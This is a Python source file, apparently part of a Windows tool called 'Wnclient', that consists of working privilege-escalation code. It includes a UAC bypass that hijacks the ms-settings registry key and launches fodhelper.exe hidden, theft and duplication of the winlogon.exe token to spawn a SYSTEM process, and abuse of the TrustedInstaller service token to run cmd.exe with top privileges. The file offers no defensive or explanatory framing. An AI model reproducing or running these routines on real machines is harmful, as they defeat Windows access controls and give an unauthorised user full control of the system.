import ctypes
import platform
import lwjgl
import sys
import os
import pathlib
import subprocess
import winreg
import time
import ctypes
import sys
from ctypes import wintypes

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def Universal():
    if platform.system() == 'Windows':
        if not is_admin():
            res_code = ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, os.path.join(pathlib.Path(__file__).parent.parent.parent,"main.py"), None, 1)
            if res_code <= 32:
                lwjgl.error(f"Failed to elevate power, return: {res_code}")
            else:
                lwjgl.info("You have acquired administrator privileges, please use the new window")
                exit()
    else:
        lwjgl.error("It can only run on Windows")

def UAC_Bypass():
    payload_cmd = f'cmd.exe /c "cd /d "{pathlib.Path(__file__).parent.parent.parent}" && "{sys.executable}" main.py"'
    try:
        key_path = r"Software\Classes\ms-settings\shell\open\command"
        

        try:
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
        except WindowsError:
            pass
        
   
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
        
        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, payload_cmd)
        
        winreg.CloseKey(key)
        
    except Exception as e:
        lwjgl.error(e)
        
    
    try:
        system32 = os.path.join(os.environ['WINDIR'], 'System32')
        fodhelper_path = os.path.join(system32, 'fodhelper.exe')
        
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE
        
        subprocess.Popen([fodhelper_path], startupinfo=startupinfo, shell=True,start_new_session=True)
        lwjgl.info("Create Success")
        lwjgl.info("You can use Wnclient in a new window")
        sys.exit()
        
        
    except Exception as e:
        lwjgl.error(e)


def GetSystem_by_Winlogon():
    
    # Load necessary Windows DLLs
    kernel32 = ctypes.WinDLL('kernel32')
    advapi32 = ctypes.WinDLL('advapi32')
    psapi = ctypes.WinDLL('psapi')
    
    # Define constants
    PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
    TOKEN_QUERY = 0x0008
    TOKEN_DUPLICATE = 0x0002
    TOKEN_ALL_ACCESS = 0xF01FF
    SecurityImpersonation = 2
    TokenPrimary = 1
    MAX_PATH = 260
    TH32CS_SNAPPROCESS = 0x00000002
    PROCESS_VM_READ = 0x0010
    PROCESS_QUERY_INFORMATION = 0x0400
    
    # Define function prototypes
    kernel32.OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
    kernel32.OpenProcess.restype = wintypes.HANDLE
    
    kernel32.CreateToolhelp32Snapshot.argtypes = [wintypes.DWORD, wintypes.DWORD]
    kernel32.CreateToolhelp32Snapshot.restype = wintypes.HANDLE
    
    kernel32.Process32FirstW.argtypes = [wintypes.HANDLE, ctypes.c_void_p]
    kernel32.Process32FirstW.restype = wintypes.BOOL
    
    kernel32.Process32NextW.argtypes = [wintypes.HANDLE, ctypes.c_void_p]
    kernel32.Process32NextW.restype = wintypes.BOOL
    
    psapi.EnumProcesses.argtypes = [ctypes.POINTER(wintypes.DWORD), wintypes.DWORD, ctypes.POINTER(wintypes.DWORD)]
    psapi.EnumProcesses.restype = wintypes.BOOL
    
    psapi.GetProcessImageFileNameW.argtypes = [wintypes.HANDLE, ctypes.c_wchar_p, wintypes.DWORD]
    psapi.GetProcessImageFileNameW.restype = wintypes.DWORD
    
    advapi32.OpenProcessToken.argtypes = [wintypes.HANDLE, wintypes.DWORD, ctypes.POINTER(wintypes.HANDLE)]
    advapi32.OpenProcessToken.restype = wintypes.BOOL
    
    advapi32.DuplicateTokenEx.argtypes = [
        wintypes.HANDLE,
        wintypes.DWORD,
        ctypes.c_void_p,
        wintypes.DWORD,
        wintypes.DWORD,
        ctypes.POINTER(wintypes.HANDLE)
    ]
    advapi32.DuplicateTokenEx.restype = wintypes.BOOL
    
    advapi32.CreateProcessWithTokenW.argtypes = [
        wintypes.HANDLE,
        wintypes.DWORD,
        wintypes.LPCWSTR,
        wintypes.LPCWSTR,
        wintypes.DWORD,
        ctypes.c_void_p,
        ctypes.c_void_p,
        ctypes.c_void_p,
        ctypes.c_void_p
    ]
    advapi32.CreateProcessWithTokenW.restype = wintypes.BOOL
    
    kernel32.GetLastError.restype = wintypes.DWORD
    kernel32.CloseHandle.argtypes = [wintypes.HANDLE]
    kernel32.CloseHandle.restype = wintypes.BOOL
    
    def get_winlogon_pid():
        """Automatically retrieve the PID of the WinLogon process."""
        
        # Method 1: Enumerate processes using EnumProcesses
        print("[*] Enumerating processes to find WinLogon...")
        
        # Get process list
        process_ids = (wintypes.DWORD * 1024)()
        bytes_returned = wintypes.DWORD()
        
        if not psapi.EnumProcesses(process_ids, ctypes.sizeof(process_ids), ctypes.byref(bytes_returned)):
            print(f"[!] EnumProcesses failed: {kernel32.GetLastError()}")
            return None
        
        num_processes = bytes_returned.value // ctypes.sizeof(wintypes.DWORD)
        
        for i in range(num_processes):
            pid = process_ids[i]
            if pid == 0:
                continue
            
            # Open process to get its name
            hProc = kernel32.OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, False, pid)
            if hProc:
                try:
                    # Get process image filename
                    filename = ctypes.create_unicode_buffer(MAX_PATH)
                    length = psapi.GetProcessImageFileNameW(hProc, filename, MAX_PATH)
                    
                    if length > 0:
                        # Check if it's winlogon.exe
                        filepath = filename.value.lower()
                        if "winlogon.exe" in filepath:
                            print(f"[+] Found WinLogon process: PID={pid}, Path={filepath}")
                            return pid
                finally:
                    kernel32.CloseHandle(hProc)
        
        # Method 2: Use Toolhelp32Snapshot as fallback
        print("[*] Attempting to find using Toolhelp32 snapshot...")
        
        class PROCESSENTRY32(ctypes.Structure):
            _fields_ = [
                ("dwSize", wintypes.DWORD),
                ("cntUsage", wintypes.DWORD),
                ("th32ProcessID", wintypes.DWORD),
                ("th32DefaultHeapID", ctypes.POINTER(wintypes.ULONG)),
                ("th32ModuleID", wintypes.DWORD),
                ("cntThreads", wintypes.DWORD),
                ("th32ParentProcessID", wintypes.DWORD),
                ("pcPriClassBase", wintypes.LONG),
                ("dwFlags", wintypes.DWORD),
                ("szExeFile", ctypes.c_wchar * MAX_PATH)
            ]
        
        hSnapshot = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
        if hSnapshot == wintypes.HANDLE(-1):
            print(f"[!] Failed to create process snapshot: {kernel32.GetLastError()}")
            return None
        
        try:
            process_entry = PROCESSENTRY32()
            process_entry.dwSize = ctypes.sizeof(PROCESSENTRY32)
            
            if kernel32.Process32FirstW(hSnapshot, ctypes.byref(process_entry)):
                while True:
                    if "winlogon.exe" in process_entry.szExeFile.lower():
                        print(f"[+] Found WinLogon process: PID={process_entry.th32ProcessID}, Name={process_entry.szExeFile}")
                        return process_entry.th32ProcessID
                    
                    if not kernel32.Process32NextW(hSnapshot, ctypes.byref(process_entry)):
                        break
        finally:
            kernel32.CloseHandle(hSnapshot)
        
        print("[!] Could not find WinLogon process")
        return None
    
    try:
        # Automatically retrieve WinLogon PID
        winlogon_pid = get_winlogon_pid()
        if not winlogon_pid:
            # If auto-retrieval fails, allow manual input
            try:
                winlogon_pid = int(input("Auto-retrieval failed. Please enter WinLogon PID: "))
            except ValueError:
                print("Invalid PID. Please enter a numeric value.")
                return 1
        
        print(f"[*] Using WinLogon PID: {winlogon_pid}")
        
        # Open the process
        hProc = kernel32.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, False, winlogon_pid)
        if not hProc:
            print(f"[!] OpenProcess failed: {kernel32.GetLastError()}")
            return 1
        
        # Open process token
        hToken = wintypes.HANDLE()
        if not advapi32.OpenProcessToken(hProc, TOKEN_QUERY | TOKEN_DUPLICATE, ctypes.byref(hToken)):
            print(f"[!] OpenProcessToken failed: {kernel32.GetLastError()}")
            kernel32.CloseHandle(hProc)
            return 1
        
        # Duplicate token
        hSysToken = wintypes.HANDLE()
        if not advapi32.DuplicateTokenEx(
            hToken, 
            TOKEN_ALL_ACCESS, 
            None, 
            SecurityImpersonation, 
            TokenPrimary, 
            ctypes.byref(hSysToken)
        ):
            print(f"[!] DuplicateTokenEx failed: {kernel32.GetLastError()}")
            kernel32.CloseHandle(hToken)
            kernel32.CloseHandle(hProc)
            return 1
        
        # Create process structures
        class STARTUPINFO(ctypes.Structure):
            _fields_ = [
                ("cb", wintypes.DWORD),
                ("lpReserved", wintypes.LPWSTR),
                ("lpDesktop", wintypes.LPWSTR),
                ("lpTitle", wintypes.LPWSTR),
                ("dwX", wintypes.DWORD),
                ("dwY", wintypes.DWORD),
                ("dwXSize", wintypes.DWORD),
                ("dwYSize", wintypes.DWORD),
                ("dwXCountChars", wintypes.DWORD),
                ("dwYCountChars", wintypes.DWORD),
                ("dwFillAttribute", wintypes.DWORD),
                ("dwFlags", wintypes.DWORD),
                ("wShowWindow", wintypes.WORD),
                ("cbReserved2", wintypes.WORD),
                ("lpReserved2", ctypes.c_void_p),
                ("hStdInput", wintypes.HANDLE),
                ("hStdOutput", wintypes.HANDLE),
                ("hStdError", wintypes.HANDLE),
            ]
        
        class PROCESS_INFORMATION(ctypes.Structure):
            _fields_ = [
                ("hProcess", wintypes.HANDLE),
                ("hThread", wintypes.HANDLE),
                ("dwProcessId", wintypes.DWORD),
                ("dwThreadId", wintypes.DWORD),
            ]
        
        si = STARTUPINFO()
        si.cb = ctypes.sizeof(STARTUPINFO)
        pi = PROCESS_INFORMATION()
        python_exe = sys.executable
        script_path = os.path.join(pathlib.Path(__file__).parent.parent.parent, "main.py")
        working_dir = str(pathlib.Path(__file__).parent.parent.parent)

 
        command_line = f'"{python_exe}" "{script_path}"'

        if not advapi32.CreateProcessWithTokenW(
            hSysToken,
            0,
            None,  # lpApplicationName 可以为 None，系统会从 lpCommandLine 解析
            command_line, 
            0,
            None,
            working_dir,  # 工作目录
            ctypes.byref(si),
            ctypes.byref(pi)
        ):
            error_code = kernel32.GetLastError()
            print(f"[!] CreateProcessWithTokenW failed: {error_code}")
            return 1
        else:
            print("[+] Successfully created process using WinLogon token!")
            print(f"[*] New process PID: {pi.dwProcessId}")
            sys.exit(0)
        
        # Cleanup handles
        kernel32.CloseHandle(hSysToken)
        kernel32.CloseHandle(hToken)
        kernel32.CloseHandle(hProc)
        kernel32.CloseHandle(pi.hProcess)
        kernel32.CloseHandle(pi.hThread)
        
        return pi.dwProcessId
        
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
        import traceback
        traceback.print_exc()
        return None



def Getit_by_Python():
    print("Permissions may be incomplete")
    

    SC_MANAGER_CONNECT = 0x0001
    SERVICE_START = 0x0010
    SERVICE_STOP = 0x0020
    SERVICE_QUERY_STATUS = 0x0004
    SC_STATUS_PROCESS_INFO = 0
    ERROR_SERVICE_NOT_ACTIVE = 1062
    TOKEN_QUERY = 0x0008
    TOKEN_DUPLICATE = 0x0002
    TOKEN_ALL_ACCESS = 0xF01FF
    SecurityImpersonation = 2
    TokenPrimary = 1
    PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
    TH32CS_SNAPPROCESS = 0x00000002
    INVALID_HANDLE_VALUE = -1
    TokenUser = 1

    # 定义 Windows 结构体
    class SERVICE_STATUS(ctypes.Structure):
        _fields_ = [
            ('dwServiceType', wintypes.DWORD),
            ('dwCurrentState', wintypes.DWORD),
            ('dwControlsAccepted', wintypes.DWORD),
            ('dwWin32ExitCode', wintypes.DWORD),
            ('dwServiceSpecificExitCode', wintypes.DWORD),
            ('dwCheckPoint', wintypes.DWORD),
            ('dwWaitHint', wintypes.DWORD),
        ]

    class SERVICE_STATUS_PROCESS(ctypes.Structure):
        _fields_ = [
            ('dwServiceType', wintypes.DWORD),
            ('dwCurrentState', wintypes.DWORD),
            ('dwControlsAccepted', wintypes.DWORD),
            ('dwWin32ExitCode', wintypes.DWORD),
            ('dwServiceSpecificExitCode', wintypes.DWORD),
            ('dwCheckPoint', wintypes.DWORD),
            ('dwWaitHint', wintypes.DWORD),
            ('dwProcessId', wintypes.DWORD),
            ('dwServiceFlags', wintypes.DWORD),
        ]

    class PROCESSENTRY32W(ctypes.Structure):
        _fields_ = [
            ('dwSize', wintypes.DWORD),
            ('cntUsage', wintypes.DWORD),
            ('th32ProcessID', wintypes.DWORD),
            ('th32DefaultHeapID', ctypes.POINTER(wintypes.ULONG)),
            ('th32ModuleID', wintypes.DWORD),
            ('cntThreads', wintypes.DWORD),
            ('th32ParentProcessID', wintypes.DWORD),
            ('pcPriClassBase', wintypes.LONG),
            ('dwFlags', wintypes.DWORD),
            ('szExeFile', wintypes.WCHAR * 260),
        ]

    class STARTUPINFOW(ctypes.Structure):
        _fields_ = [
            ('cb', wintypes.DWORD),
            ('lpReserved', wintypes.LPWSTR),
            ('lpDesktop', wintypes.LPWSTR),
            ('lpTitle', wintypes.LPWSTR),
            ('dwX', wintypes.DWORD),
            ('dwY', wintypes.DWORD),
            ('dwXSize', wintypes.DWORD),
            ('dwYSize', wintypes.DWORD),
            ('dwXCountChars', wintypes.DWORD),
            ('dwYCountChars', wintypes.DWORD),
            ('dwFillAttribute', wintypes.DWORD),
            ('dwFlags', wintypes.DWORD),
            ('wShowWindow', wintypes.WORD),
            ('cbReserved2', wintypes.WORD),
            ('lpReserved2', ctypes.POINTER(wintypes.BYTE)),
            ('hStdInput', wintypes.HANDLE),
            ('hStdOutput', wintypes.HANDLE),
            ('hStdError', wintypes.HANDLE),
        ]

    class PROCESS_INFORMATION(ctypes.Structure):
        _fields_ = [
            ('hProcess', wintypes.HANDLE),
            ('hThread', wintypes.HANDLE),
            ('dwProcessId', wintypes.DWORD),
            ('dwThreadId', wintypes.DWORD),
        ]

    class TOKEN_USER(ctypes.Structure):
        _fields_ = [
            ('SID', ctypes.c_void_p),
            ('ATTRIBUTES', wintypes.DWORD),
        ]

    # 加载 Windows DLL
    advapi32 = ctypes.windll.advapi32
    kernel32 = ctypes.windll.kernel32

    # 设置函数参数和返回类型
    OpenSCManagerW = advapi32.OpenSCManagerW
    OpenSCManagerW.argtypes = [wintypes.LPCWSTR, wintypes.LPCWSTR, wintypes.DWORD]
    OpenSCManagerW.restype = wintypes.SC_HANDLE

    OpenServiceW = advapi32.OpenServiceW
    OpenServiceW.argtypes = [wintypes.SC_HANDLE, wintypes.LPCWSTR, wintypes.DWORD]
    OpenServiceW.restype = wintypes.SC_HANDLE

    QueryServiceStatusEx = advapi32.QueryServiceStatusEx
    QueryServiceStatusEx.argtypes = [wintypes.SC_HANDLE, ctypes.c_int, ctypes.c_void_p, wintypes.DWORD, ctypes.POINTER(wintypes.DWORD)]
    QueryServiceStatusEx.restype = wintypes.BOOL

    StartServiceW = advapi32.StartServiceW
    StartServiceW.argtypes = [wintypes.SC_HANDLE, wintypes.DWORD, ctypes.POINTER(wintypes.LPWSTR)]
    StartServiceW.restype = wintypes.BOOL

    ControlService = advapi32.ControlService
    ControlService.argtypes = [wintypes.SC_HANDLE, wintypes.DWORD, ctypes.POINTER(SERVICE_STATUS)]
    ControlService.restype = wintypes.BOOL

    QueryServiceStatus = advapi32.QueryServiceStatus
    QueryServiceStatus.argtypes = [wintypes.SC_HANDLE, ctypes.POINTER(SERVICE_STATUS)]
    QueryServiceStatus.restype = wintypes.BOOL

    CloseServiceHandle = advapi32.CloseServiceHandle
    CloseServiceHandle.argtypes = [wintypes.SC_HANDLE]
    CloseServiceHandle.restype = wintypes.BOOL

    OpenProcessToken = advapi32.OpenProcessToken
    OpenProcessToken.argtypes = [wintypes.HANDLE, wintypes.DWORD, ctypes.POINTER(wintypes.HANDLE)]
    OpenProcessToken.restype = wintypes.BOOL

    GetTokenInformation = advapi32.GetTokenInformation
    GetTokenInformation.argtypes = [wintypes.HANDLE, ctypes.c_int, ctypes.c_void_p, wintypes.DWORD, ctypes.POINTER(wintypes.DWORD)]
    GetTokenInformation.restype = wintypes.BOOL

    ConvertSidToStringSidW = advapi32.ConvertSidToStringSidW
    ConvertSidToStringSidW.argtypes = [ctypes.c_void_p, ctypes.POINTER(wintypes.LPWSTR)]
    ConvertSidToStringSidW.restype = wintypes.BOOL

    LocalFree = kernel32.LocalFree
    LocalFree.argtypes = [wintypes.HLOCAL]
    LocalFree.restype = wintypes.HLOCAL

    DuplicateTokenEx = advapi32.DuplicateTokenEx
    DuplicateTokenEx.argtypes = [
        wintypes.HANDLE, wintypes.DWORD, wintypes.LPVOID, 
        ctypes.c_int, ctypes.c_int, ctypes.POINTER(wintypes.HANDLE)
    ]
    DuplicateTokenEx.restype = wintypes.BOOL

    CreateProcessWithTokenW = advapi32.CreateProcessWithTokenW
    CreateProcessWithTokenW.argtypes = [
        wintypes.HANDLE, wintypes.DWORD, wintypes.LPCWSTR, wintypes.LPWSTR,
        wintypes.DWORD, wintypes.LPVOID, wintypes.LPCWSTR, ctypes.POINTER(STARTUPINFOW),
        ctypes.POINTER(PROCESS_INFORMATION)
    ]
    CreateProcessWithTokenW.restype = wintypes.BOOL

    GetCurrentProcess = kernel32.GetCurrentProcess
    GetCurrentProcess.restype = wintypes.HANDLE

    CreateToolhelp32Snapshot = kernel32.CreateToolhelp32Snapshot
    CreateToolhelp32Snapshot.argtypes = [wintypes.DWORD, wintypes.DWORD]
    CreateToolhelp32Snapshot.restype = wintypes.HANDLE

    Process32FirstW = kernel32.Process32FirstW
    Process32FirstW.argtypes = [wintypes.HANDLE, ctypes.POINTER(PROCESSENTRY32W)]
    Process32FirstW.restype = wintypes.BOOL

    Process32NextW = kernel32.Process32NextW
    Process32NextW.argtypes = [wintypes.HANDLE, ctypes.POINTER(PROCESSENTRY32W)]
    Process32NextW.restype = wintypes.BOOL

    GetModuleFileNameW = kernel32.GetModuleFileNameW
    GetModuleFileNameW.argtypes = [wintypes.HMODULE, wintypes.LPWSTR, wintypes.DWORD]
    GetModuleFileNameW.restype = wintypes.DWORD

    OpenProcess = kernel32.OpenProcess
    OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
    OpenProcess.restype = wintypes.HANDLE

    CloseHandle = kernel32.CloseHandle
    CloseHandle.argtypes = [wintypes.HANDLE]
    CloseHandle.restype = wintypes.BOOL

    GetLastError = kernel32.GetLastError
    GetLastError.restype = wintypes.DWORD

    Sleep = kernel32.Sleep
    Sleep.argtypes = [wintypes.DWORD]
    
    # 内部辅助函数
    def control_service(service_name, action):
        hSCManager = OpenSCManagerW(None, None, SC_MANAGER_CONNECT)
        if not hSCManager:
            return False
        
        hService = OpenServiceW(hSCManager, service_name, SERVICE_START | SERVICE_STOP | SERVICE_QUERY_STATUS)
        if not hService:
            CloseServiceHandle(hSCManager)
            return False
        
        isSuccess = False
        
        if action == "start":
            ssStatus = SERVICE_STATUS_PROCESS()
            dwBytesNeeded = wintypes.DWORD(0)
            
            if QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, ctypes.byref(ssStatus), 
                                   ctypes.sizeof(SERVICE_STATUS_PROCESS), ctypes.byref(dwBytesNeeded)):
                if ssStatus.dwCurrentState == 4:  # SERVICE_RUNNING
                    isSuccess = True
                else:
                    if StartServiceW(hService, 0, None):
                        for i in range(50):
                            Sleep(30)
                            if QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, ctypes.byref(ssStatus), 
                                                   ctypes.sizeof(SERVICE_STATUS_PROCESS), ctypes.byref(dwBytesNeeded)) and ssStatus.dwCurrentState == 4:
                                isSuccess = True
                                break
        elif action == "stop":
            ssStatus = SERVICE_STATUS()
            if ControlService(hService, 1, ctypes.byref(ssStatus)):  # SERVICE_CONTROL_STOP
                for i in range(50):
                    Sleep(100)
                    if QueryServiceStatus(hService, ctypes.byref(ssStatus)) and ssStatus.dwCurrentState == 1:  # SERVICE_STOPPED
                        isSuccess = True
                        break
            else:
                if GetLastError() == ERROR_SERVICE_NOT_ACTIVE:
                    isSuccess = True
        
        CloseServiceHandle(hService)
        CloseServiceHandle(hSCManager)
        return isSuccess

    def get_system_pid():
        pe = PROCESSENTRY32W()
        pe.dwSize = ctypes.sizeof(PROCESSENTRY32W)
        
        hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
        if hSnap == INVALID_HANDLE_VALUE:
            return 0
        
        pid = 0
        if Process32FirstW(hSnap, ctypes.byref(pe)):
            while True:
                if pe.szExeFile.lower() == "services.exe":
                    pid = pe.th32ProcessID
                    break
                if not Process32NextW(hSnap, ctypes.byref(pe)):
                    break
        
        CloseHandle(hSnap)
        return pid
    
    def get_ti_pid():
        pe = PROCESSENTRY32W()
        pe.dwSize = ctypes.sizeof(PROCESSENTRY32W)
        
        hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
        if hSnap == INVALID_HANDLE_VALUE:
            return 0
        
        pid = 0
        if Process32FirstW(hSnap, ctypes.byref(pe)):
            while True:
                if pe.szExeFile.lower() == "trustedinstaller.exe":
                    pid = pe.th32ProcessID
                    break
                if not Process32NextW(hSnap, ctypes.byref(pe)):
                    break
        
        CloseHandle(hSnap)
        return pid
    
    def run_as_trusted_installer():
        # 构建要运行的命令
        target_exe = "cmd.exe"
        parent_dir = pathlib.Path(__file__).parent.parent.parent
        args = f'/c "cd /d "{parent_dir}" && "{sys.executable}" main.py"'
        
        print(f"Starting program with TrustedInstaller privileges: {target_exe} {args}\n(by Wnclient)")
        
        # 启动TrustedInstaller服务
        if not control_service("TrustedInstaller", "start"):
            print("Failed to start TrustedInstaller service")
            return False
        
        time.sleep(1)
        
        # 获取TrustedInstaller进程PID
        ti_pid = get_ti_pid()
        if ti_pid == 0:
            print("TrustedInstaller process not found")
            control_service("TrustedInstaller", "stop")
            return False
        
        # 打开TrustedInstaller进程
        hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, False, ti_pid)
        if not hProc:
            print(f"Failed to open process: {GetLastError()}")
            control_service("TrustedInstaller", "stop")
            return False
        
        # 获取进程令牌
        hToken = wintypes.HANDLE()
        if not OpenProcessToken(hProc, TOKEN_QUERY | TOKEN_DUPLICATE, ctypes.byref(hToken)):
            print(f"Failed to open process token: {GetLastError()}")
            CloseHandle(hProc)
            control_service("TrustedInstaller", "stop")
            return False
        
        # 复制令牌
        hSysToken = wintypes.HANDLE()
        if not DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, None, SecurityImpersonation, TokenPrimary, ctypes.byref(hSysToken)):
            print(f"Failed to duplicate token: {GetLastError()}")
            CloseHandle(hToken)
            CloseHandle(hProc)
            control_service("TrustedInstaller", "stop")
            return False
        
        # 创建进程
        si = STARTUPINFOW()
        si.cb = ctypes.sizeof(STARTUPINFOW)
        pi = PROCESS_INFORMATION()
        
        # 构建命令行
        command_line = f'"{target_exe}" {args}'
        
        if not CreateProcessWithTokenW(
            hSysToken, 0, target_exe, command_line, 0, None, None, 
            ctypes.byref(si), ctypes.byref(pi)
        ):
            print(f"Startup failed, error code: {GetLastError()}")
            success = False
        else:
            print("Startup successful!")
            sys.exit(0)
            CloseHandle(pi.hProcess)
            CloseHandle(pi.hThread)
            success = True
        
        # 清理资源
        CloseHandle(hSysToken)
        CloseHandle(hToken)
        CloseHandle(hProc)
        
        # 停止TrustedInstaller服务
        control_service("TrustedInstaller", "stop")
        
        return success
    
    return run_as_trusted_installer()

